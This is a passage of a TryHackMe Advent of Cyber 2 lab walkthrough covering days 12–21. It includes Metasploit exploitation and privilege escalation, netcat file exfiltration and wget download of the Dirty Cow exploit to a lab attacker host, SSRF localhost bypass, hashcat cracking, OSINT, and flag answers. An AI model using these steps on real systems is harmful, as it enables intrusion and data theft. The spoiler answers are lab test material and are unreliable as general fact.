   Now we need to view our options and set the correct parameters.
   
   ```cmd
   options
   set targeturi /cgi-cin/elfwhacker.bat
   set lhost 10.18.78.136
   set lport 1337
   set rhost 10.10.1.196
   options
   ```
   
   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Options.png)
   
   So we can just use `run` to let the exploit start. This gives us a nice session which we can move into with `shell`.
   
   ![MSF Run](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Run.png)
   
   Now we can enumerate the directory and view the contents of the flag (`type` does work here fortunately).
   
   ![MSF Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Flag1.png)
   
   ><details><summary>Click for answer</summary>thm{whacking_all_the_elves}</details>

5. Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!

   Unfortunately, I couldn't get this to work with the post exploit scripts as mentioned in the hint. I did, however, manage to use `getsystem` to gain admin priveleges.
   
   ![Get System](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Get_System.png)
   
   The first method I used (which didn't work yet) was as follows:
   
   `search exploit suggest` this gave us the exploit suggestion module.
   
   ![MSF Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest.png)
   
   For this modules we only needed to add our session number.
   
   ![MSF Suggester Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest_Options.png)
   
   Unfortunately, I couldn't get it to connect. I will have to look at some Priv Esc rooms for this one.
   
   Some more resources I used:

   - [Getsystem command for Metasploit - Priv Esc](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)
   - [Windows privilege escalation - Reddit](https://www.reddit.com/r/HowToHack/comments/6zxh68/looking_for_some_help_with_windows_privilege/)

   **UPDATE!**
   
   I managed to find a different way that worked by using a local exploit as suggested by the hint. I tried a more specific search string to find a module I could use. Since `PATH` was mentioned in the hint, I tried adding this to my query.
   
   ```cmd
   search exploit windows local path
   ```
   
   ![Priv Esc Module Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Priv_Module_Search.png)
   
   Looks like there is another module we can try `unquoted_service_path`.
   
   ```cmd
   use exploit/windows/local/unquoted_service_path
   
   options
   
   set session 1
   ```
   
   We have now loaded the module and set the necessary options. Our current `user` session on the machine is `1`. Now type `run` to start the exploit.
   
   ![Priv Esc Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Priv_Options.png)
   
   Looks like it worked. To check, we can run the `getuid` command again to find out which user we are.
   
   ![Priv Esc Getuid](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Escalated.png)
   
   Success! We have now escalated our priveleges on this machine!

### [Day 13] [Coal for Christmas](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2013)

In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escalate our privileges and get the flag. More information on the exploit can be found [here](https://dirtycow.ninja/).

3. What old, deprecated protocol and service is running?

   Running an nmap scan with `nmap -sV 10.10.202.23` we can get more information on the services running on the machine. 
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Nmap.png)

   ><details><summary>Click for answer</summary>telnet</details>

4. What credential was left for you?

   Now we now the port used for telnet (23), we can use this protocol to log into the system using `telnet 10.10.202.23`. We are greeted with a message containing credentials we can use.
   
   ![Telnet Log In](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Telnet_Log_In.png)

   ><details><summary>Click for answer</summary>clauschristmas</details>

5. What distribution of Linux and version number is this server running?

   Several usefull enumeration commands can be found [here](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
). One of the commands we can use to find information about the system is `cat /etc/*release`.

   ![System Info](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Release.png)

   ><details><summary>Click for answer</summary>ubuntu 12.04</details>

6. Who got here first?

   One way to read the file is to use `cat`. Probably the most easy method. Another way would be to use `netcat` to download the file onto our system. On our machine we use the following command:
   
   ```cmd
   nc -nlvp 1337 > cookies_and_milk.txt
   ```
   
   On the target machine we can then use the following:
   
   ```cmd
   nc -w 3 10.18.78.136 1337 < cookies_and_milk.txt
   ```
   
   As you can see in the image below, I made some typos and the current shell didn't have any luxuries. So I decided to use my previously learned skills to stabalize our shell with python. Using:
   
   ```cmd
   python -c import pty; pty.spawn("/bin/bash")'
   ```
   
   ![Stabalize shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Stabalize.png)
   
   Although unneccesary for this part, it did make things easier down the road.
   
   ![Cookie Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Cookies.png)

   ><details><summary>Click for answer</summary>grinch</details>

8. What is the verbatim syntax you can use to compile, taken from the real C source code comments?

   After doing some research via [https://dirtycow.ninja/](https://dirtycow.ninja/), I found the original script used on [Github](https://github.com/FireFart/dirtycow/raw/master/dirty.c). On this page it was writen how to compile the script.
   
   ![Compile Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Compile.png)

   ><details><summary>Click for answer</summary>gcc -pthread dirty.c -o dirty -lcrypt</details>

9. What "new" username was created, with the default operations of the real C source code?

   First, we need to get to script onto our target machine. I tried using netcat, but this time it didn't work. So I fired up an http server and requested the file from the target machine.
   
   ```cmd
   python3 -m http.server 8080
   ```
   
   Now we can get it on the target machine with:
   
   ```cmd
   wget http://10.18.78.136:8080/dirty.c
   ```
   
   ![Send Cow Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Send_Cow.png)
   
   I had a different name for the script and the challenge required a specific name `dirty.c`. That is why the commands differ from the images which were taken before that realization..
   
   Now we can compile and run the script with the following commands:
   
   ```cmd
   gcc -pthread dirty.c -o dirty -lcrypt
   
   ./dirty.c
   ```
   
   ![Compile Run](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Compile_Run.png)
   
   The message shows us which user has been created. Examing the `/home/` folder or the `/etc/passwd` file confirmed this. This is also the same name that was given in the script itself before we uploaded it to the machine.

   ><details><summary>Click for answer</summary>firefart</details>

11. What is the MD5 hash output?

   Now we can use `su firefart` to swith to this newly created user and navigate to the root folder. Here we find another message with the last instructions.
   
   ![Root Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Message.png)
   
   Looks like we need to create a file and then generate a checksum for the directory. We can do so with the following commands (**Make sure you are in the correct directory**):
   
   ```cmd
   touch coal
   tree | md5sum
   ```
   
   ![Md5sum](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Md5sum.png)

   ><details><summary>Click for answer</summary>8b16f00dd3b51efadb02c1df7f8427cc</details>

### [Day 14] [Where's Rudolph?](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2014)

In this task we will be using OSINT to find out where Rudolph is. The only thing we are provided here is his username for Reddit.

**Username:** `IGuidetheClaus2020`

1. What URL will take me directly to Rudolph's Reddit comment history?

   After we find the page for 'IGuidetheClaus2020' we can click on the comments tab to view his comment history.
   
   ![Reddit Comment History](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Reddit_History.png)

   ><details><summary>Click for answer</summary>https://www.reddit.com/user/IGuidetheClaus2020/comments/</details>

2. According to Rudolph, where was he born?

   Looking at some of his comments, we find the following:
   
   ![Reddit Born](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Reddit_Born.png)

   ><details><summary>Click for answer</summary>Chicago</details>

3. Rudolph mentions Robert.  Can you use Google to tell me Robert's last name?

   In the last comment he also mentioned his creator Robert. An online search can give us his last name.
   
   ![Creator Name](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Creator_Name.png)

   ><details><summary>Click for answer</summary>May</details>

4. On what other social media platform might Rudolph have an account?

   We can use several of the mentioned websites and programs to find any related user accounts for Rudolph. We manage to find an account on Twitter.
   
   ![Accounts](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Accounts.png)

   ><details><summary>Click for answer</summary>twitter</details>

5. What is Rudolph's username on that platform?

   After a search for his username on twitter we find his handle on Twitter.
   
   ![Twitter Handle](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Twitter.png)

   ><details><summary>Click for answer</summary>IGuideClaus2020</details>

6. What appears to be Rudolph's favorite TV show right now?

   Going through some of his tweets, we can find out what his recent favorite show is. The message is from nov 2020, but for this challenge that was about a month ago.
   
   ![Favorite Show](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_TV_Show.png)

   ><details><summary>Click for answer</summary>Bachelorette</details>

7. Based on Rudolph's post history, he took part in a parade.  Where did the parade take place?

   We also find several posts about a parade he took part in. We can do a reverse image search on these images to find out where this was taken.
   
   ![Reverse Image Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Reverse_Image.png)

   ><details><summary>Click for answer</summary>Chicago</details>

8. Okay, you found the city, but where specifically was one of the photos taken?

   One Twitter post revealed a larger image, which could possibly contain some interesting data. 
   
   ![Large Image](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Large_Image.png)
   
   Although the coordinates where quickly found using `exiftools`, I had a hard time getting the right answer in the correct format, as many websites converted it slightly different.
   
   ![Exif Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Exif.png)
   
   Plugging the results into Google Maps yielded something close, but it wasn't correct (it was of by only 0.000001).
   
   ![Coordinates 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Coordinates_1.png)
   
   Another website was slightly off as well (by 0.000002).
   
   ![Coordinates 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Coordinates_2.png)
   
   A third site contained a link to Google Maps which was correct at last!
   
   ![Coordinates 3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Coordinates_3.png)
   
   ![Coordinates 4](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Coordinates_4.png)

   ><details><summary>Click for answer</summary>41.891815,-87.624277</details>

9. Did you find a flag too?

   The exif tool from the previous question also found us a flag in the copyright field.

   ><details><summary>Click for answer</summary>{FLAG}ALWAYSCHECKTHEEXIFD4T4</details>

10. Has Rudolph been pwned? What password of his appeared in a breach?

    We can do a search on [https://haveibeenpwned.com/](https://haveibeenpwned.com/) for the email address we found on twitter.
    
    ![Email Address](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Email.png)
    
    Although, it did mention a breach, no passwords were shown. Unfortunately, the provided site [http://scylla.so/](http://scylla.so/) was currently offline. So I had to find an alternative website. I searched through several of the below alternatives I could find:
    
    ![H8mail Sites](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_h8mail.png)
    
    Only [https://breachdirectory.org/](https://breachdirectory.org/) seemed to work. Unfortunately, it only showed a partial password associated with the email. 
    
    ![Breached Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Passwords.png)
    
    Doing a quick search through the `rockyou` password list, we found several hits. We could just try all there, but that wouldn't be practical in other situations.
    
    ![Rockyou Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Rockyou.png)
    
    Luckily, it does show us the SHA1 hash of the password. This means we can use `hashcat` to possibly crack the password. We can do a normal hashcat search with the following command after saving the hashes to a file:
    
    ![Hashes](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Hashes.png)
    
    ```cmd
    hashcat -m 100 rudolphpass.txt /usr/share/wordlists/rockyou.txt
    ```
    
    However, since we have a partial password, I wanted to try and make a bit more elegant solution. Completely unnecessary, since it would normally complete in a short time, but it was a fun way to learn more about the various commands used. Using the following commands we can pipe all entries from the `rockyou` list shich could be our password to a separate list (heck, lets try both passwords we found).
    
    ```cmd
    cat /usr/share/wordlists/rockyou.txt | grep "^spyg...$" > rudolphpass.txt
    
    cat /usr/share/wordlists/rockyou.txt | grep "^liv............$" >> rudolphpass.txt
    ```
    
    With some clever regexing we get a list with all possible passwords. Now we can run the following command with our custom word list and the saved hashes.
    
    ```cmd
    hashcat -m 100 rudolphpass.hash rudolphpass.txt
    ```
    
    ![Hashcat Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Hashcat_1.png)
    
    Boom, we managed to find our password, unfortunately, the second one was not found. Luckily, the first one was all we needed for the question.
    
    ![Hashcat Result](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Hashcat_2.png)

    ><details><summary>Click for answer</summary>spygame</details>

11. Based on all the information gathered.  It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address?

    In one of his Twitter posts, he mentioned something about the Marriott hotel. Lets find any hotels in this area.
    
    ![Marriott Hotel](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Hotel.png)

    ><details><summary>Click for answer</summary>540</details>

### [Day 15] [There's a Python in my stocking!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2015)

In this task we will be learning some basics from Python. More resources can be found here:

- [Python Zero to Hero](https://polymath.cloud/python/)
- [Python Moduluo Operator in Practice](https://realpython.com/python-modulo-operator/)
- [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/)

1. What's the output of True + True?

   ![Python True](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2015/Python_True.png)

   ><details><summary>Click for answer</summary>2</details>

2. What's the database for installing other peoples libraries called?

   This was mentioned in the task description.

   ><details><summary>Click for answer</summary>PyPi</details>

3. What is the output of bool("False")?

   ![Python Bool](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2015/Python_Bool.png)

   ><details><summary>Click for answer</summary>True</details>

4. What library lets us download the HTML of a webpage?

   This was also mentioned in the task description.

   ><details><summary>Click for answer</summary>requests</details>

5. What is the output of the program provided in "Code to analyse for Question 5" in today's material?

   (This code is located above the Christmas banner and below the links in the main body of this task)

   For this we can use the interactive editor or create a script and run that.
   
   ![Python Print](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2015/Python_Print.png)

   ><details><summary>Click for answer</summary>[1, 2, 3, 6]</details>

6. What causes the previous task to output that?

   This was also mentioned in the task description.

   ><details><summary>Click for answer</summary>pass by reference</details>

### [Day 16] [Help! Where is Santa?](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2016)

In this task we will be using the knowledge whe gained about Python from the previous day.

1. What is the port number for the web server?

   To get the port number we can run an nmap scan on the target.
   
   ![Python Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Nmap.png)

   ><details><summary>Click for answer</summary>80</details>

2. Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)

   To get the links from the website we can use the `requests` module for Python to write a script:
   
   ```cmd
   from bs4 import BeautifulSoup
   import requests
   
   html = requests.get('http://10.10.137.55:80/static/index.html/').text
   soup = BeautifulSoup(html, 'lxml')
   links = soup.find_all('a', href=True)
   
   for i in links:
   	print(i['href'])
   ```
   
   ![Python Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Script.png)
   
   Running this gives us a list of links on the webpage, of which one seems to be the correct one.
   
   ![Python Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Directory.png)

   ><details><summary>Click for answer</summary>/api/</details>

3. Where is Santa right now?

   To find out the correct key, we can again use the `request` module to make requests to the server until we get a response back that we are looking for.
   
   ```cmd
   from bs4 import BeautifulSoup
   import requests
   
   for key in range(1,100,2):
	response = requests.get('http://10.10.98.218:80/api/' + str(key))
	print(response.text)
   ```
   
   The range function gives us all odd numbers from 1-99 for us to iterate through.
   
   ![Python Api Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Api_Script.png)
   
   ![Python Api Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Api_Key.png)

   ><details><summary>Click for answer</summary>Winter Wonderland, Hyde Park, London.</details>

4. Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you. 

   To unblock yourself, simply terminate and re-deploy the target instance (MACHINE_IP)
   
   This answer comes from the result from the previous question.

   ><details><summary>Click for answer</summary>57</details>

### [Day 17] [ReverseELFneering](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2017)

In this task we will be using Radare2 to reverse engineer an executable to find out how the program works.

We could run this tool on the target machine, but I wanted to have the files on my VM an analyze them from there. Since an ssh service was available on the target machine we can use `scp` to download the files. I first ssh'ed into the machine to find the files and there location and then used the following commands to download them to my machine.

```cmd
scp elfmceager@10.10.83.125:/home/elfmceager/challenge1 challenge1

scp elfmceager@10.10.83.125:/home/elfmceager/file1 file1
```

![Download Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Download_Files.png)

Now we can open `challenge1` and analyze it with Radare2.

```cmd
r2 -d ./challenge1

> aa
```

![Main Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Main_Script.png)

Now we can search for an entrypoint with `afl | grep "main"`. Then we can view it using `pdf @main`.

1. What is the value of local_ch when its corresponding movl instruction is called (first if multiple)?

   Its first mov instruction is called on the 3rd line. So lets place a breakpoint on the 4th line to evaluate what local_ch is at that point.
  
   ```cmd
   > db 0x00400b58	-> Used to add the breakpoint
   > pdf @main		-> View the instructions and the breakpoints
   > dc			-> Execute instruction up to breakpoint
   > pdf			-> View current state
   ```
  
   ![Breakpoint 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Breakpoint_1.png)
  
   As we can see in the image above, the program was stopped at our breakpoint. We can now view the value of local_ch with:
  
   ```cmd
   > px @rbp-0xc
   ```
  
   ![Value 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Value_1.png)
  
   Looks like the value is `1`.

   ><details><summary>Click for answer</summary>1</details>

2. What is the value of eax when the imull instruction is called?

   Now we must place another breakpoint after the imul instruction has been called. Check it, then run up to it.
   
   ```cmd
   > db 0x00400b66
   > pdf @main
   > dc
   > pdf
   ```
   
   ![Breakpoint 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Breakpoint_2.png)
   
   Now we can view the value of the registry with:
   
   ```cmd
   > dr
   ```
  
   ![Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Registry.png)
   
   ><details><summary>Click for answer</summary>6</details>

3. What is the value of local_4h before eax is set to 0?

   From the image above, we can see we only need to move one step furter into the program to get to the specified instruction. To do this we can supply another breakpoint or we can simply use `ds` to move to the next instruction.
   
   Then we can view the value of the variable with:
   
   ```cmd
   > px @rbp-0x4
   ```
   
   ![Next Step](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Next_Step.png)

   ><details><summary>Click for answer</summary>6</details>

### [Day 18] [The Bits of Christmas](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2018)

In this task we will be using a different tool for decompiling the executable to find stored information in the program.

For this task we can use either [ILSpy](https://github.com/icsharpcode/ILSpy) or [Dotpeek](https://www.jetbrains.com/decompiler/).

2. What is Santa's password?

   Lets open ILSpy and open the executable in it. Now we must search through the various entries for anything interesting. After opening the program itself we are immediatly greeted with a log in screen. Looks like we can start our search with the `MainForm`. Here we find a `buttonActivate` entry which could be of interest. Here we can indeed find the string that is used as a comparison.
   
   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2018/Bits_Password.png)
   
   Using Dotpeek we can find the same result. However, this can be found in the MainForm itself.
   
   ![Password 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2018/Bits_Password_2.png)

   ><details><summary>Click for answer</summary>santapassword321</details>

3. Now that you've retrieved this password, try to login...What is the flag?

   On the same entry, we can also find and entry which displays a message with the flag.
   
   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2018/Bits_Flag_1.png)
   
   However, lets also log into the program and find the flag that way.
   
   ![Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2018/Bits_Flag_2.png)

   ><details><summary>Click for answer</summary>thm{046af}</details>

### [Day 19] [The Naughty or Nice List](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2019)

In this task we will be using Server Side Request Forgery or SSRF to get information out of the system we are not supposed to.

1. What is Santa's password?

   After navigating to the website and enter a name we take note of the URL. After decoding it through CyberChef we get a clearer idea.
   
   ![URL Decoded](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_URL_Decode.png)
   
   Looks like a re-direct to a local machine, since .hohoho isn't a valid top-level domain. We could try connecting to the root directory by navigating to the following URL (make sure to properly encode the URL):
   
   ```cmd
   http://10.10.44.100/?proxy=http://list.hohoho:8080/
   ```
   
   ![Modified URL](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Modified_URL.png)
   
   This looks promising as the request was indeed made and a response was returned. Lets try a different port. 80 for the default http traffic.
   
   ```cmd
   http://10.10.44.100/?proxy=http://list.hohoho:80/
   ```
   
   ![Connect 80](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_80_Refused.png)
   
   Seems like port 80 is not open for use.
   
   Lets try the ssh port 22.
   
   ```cmd
   http://10.10.44.100/?proxy=http://list.hohoho:22/
   ```
   
   ![Connect 22](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_22_Reset.png)
   
   The message does suggest the port is open, but did not understand the request. Lets now try connecting to the machine itself through `localhost`.
   
   ```cmd
   http://10.10.44.100/?proxy=http://localhost/
   ```
   
   ![Localhost](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Local.png)
   
   Seems like the domain is blocked. The same happens with 127.0.0.1. We will try to bypass it with `localtest.me`. This domain resolves all requests to 127.0.0.1.
   
   ```cmd
   http://10.10.44.100/?proxy=http://list.hohoho.localtest.me/
   ```
   
   ![Localhost](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Localhost.png)
   
   Looks like we found our password.

   ><details><summary>Click for answer</summary>Be good for goodness sake!</details>

2. What is the challenge flag?

   Now we can login into the admin panel. Make sure you are using the original URL.
   
   ![Delete List](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Delete.png)
   
   After deleting the list, we get our flag.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2019/List_Flag.png)

   ><details><summary>Click for answer</summary>THM{EVERYONE_GETS_PRESENTS}</details>

### [Day 20] [PowershELlF to the rescue](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2020)

In this task we will be using PowerShell to get information off of the target machine.

- **Username:** mceager
- **Password:** r0ckStar!

First we log into the machine using ssh.

```cmd
ssh mceager@10.10.202.160
```

1. Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?

   Next we start PowerShell. Then we can look for any hidden files in Documents.
   
   ```cmd
   Set-Location .\Documents\
   Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
   ```
   
   ![Get File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Get_File.png)
   
   Now we must get the contents of this file we just found.
   
   ```cmd
   Get-Content -Path e1fone.txt
   ```
   
   ![Hidden File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Hidden_File.png)

   ><details><summary>Click for answer</summary>2 front teeth</details>

2. Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?

   First we need to navigate into the correct folder using `..\Desktop`. Then we use the following command to find any hidden folder:
   
   ```cmd
   Get-ChildItem -Directory -Hidden -ErrorAction SilentlyContinue
   ```
   
   ![Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Directory.png)
   
   After navigating into this folder we can look for any files and view their contents.
   
   ![Second File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Second_File.png)

   ><details><summary>Click for answer</summary>Scrooged</details>

3. Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder? (This command will take a while)

   At first I used the `Select-String` cmdlet as a means to search for a specific folder/text. This didn't work though and I found out you could use a filter with the `Get-ChildItem` cmdlet as well. Using the following command, we can look for any folders in the windows directory containing the number `3`.
   
   ```cmd
   Get-ChildItem -Directory -Hidden -Filter '*3*' -Recurse -ErrorAction SilentlyContinue
   ```
   
   ![Third Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Third_Folder.png)

   ><details><summary>Click for answer</summary>3lfthr3e</details>

4. How many words does the first file contain?

   After finding the directory, we can use `Set-Location` to move into that folder and look for any files using:
   
   ```cmd
   Get-ChildItem -Hidden -ErrorAction SilentlyContinue
   ```
   
   ![Hidden Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Third_Hidden_Files.png)
   
   Now we can get the number of words in the first file with:
   
   ```cmd
   Get-Content -Path 1.txt | Measure-Object -Word
   ```

   ><details><summary>Click for answer</summary>9999</details>

5. What 2 words are at index 551 and 6991 in the first file?

   To find out what string is located on a particular index we use the following command:
   
   ```cmd
   (Get-Content -Path 1.txt)[551]
   ```
   
   ![Words](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Words.png)

   ><details><summary>Click for answer</summary>Red Ryder</details>

6. This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want? (use spaces when submitting the answer)

   To find out the rest of the answer, I had to try several things before I succeeded. The hint did help in this. Using the search function we can look for a string in a file.
   
   ```cmd
   Select-String -Path 2.txt -Pattern 'RedRyder'
   ```
   
   ![Last Word](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2020/Powershell_Last_Word.png)

   ><details><summary>Click for answer</summary>Red Ryder bb gun</details>

### [Day 21] [Time for some ELForensics](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2021)

In this task we will be using PowerShell to get more information about an executable to get access to our list.

- **Username:** littlehelper
- **Password:** iLove5now!

1. Read the contents of the text file within the Documents folder. What is the file hash for db.exe?

   For this question we simply navigate to the Documents folder and open the text file.
   
   ![File Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Hash.png)

   ><details><summary>Click for answer</summary>596690FFC54AB6101932856E6A78E3A1</details>

2. What is the file hash of the mysterious executable within the Documents folder?

   For this we can use PowerShell to analyze the file for a hash.
   
   ```cmd
   Get-FileHash -Algorithm MD5 "C:\Users\littlehelper\Documents\deebee.exe"
   ```
   
   ![Hash Found](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Hash_Found.png)

   ><details><summary>Click for answer</summary>5F037501FB542AD2D9B06EB12AED09F0</details>

3. Using Strings find the hidden flag within the executable?

   We can use the following command to search for any strings within an executable:
   
   ```cmd
   C:\Tools\strings564.exe -accepteula "C:\Users\littlehelper\Documents\deebee.exe"
   ```
   
   ![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Strings.png)
   
   As you can see, this gives a lot of results. We can simply scroll through the results or we can pipe the results to `findstr` to look for any strings that could be the flag.
   
   ```cmd
   C:\Tools\strings564.exe -accepteula "C:\Users\littlehelper\Documents\deebee.exe" \ findstr /i THM
   ```
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2021/Forensics_Flag1.png)

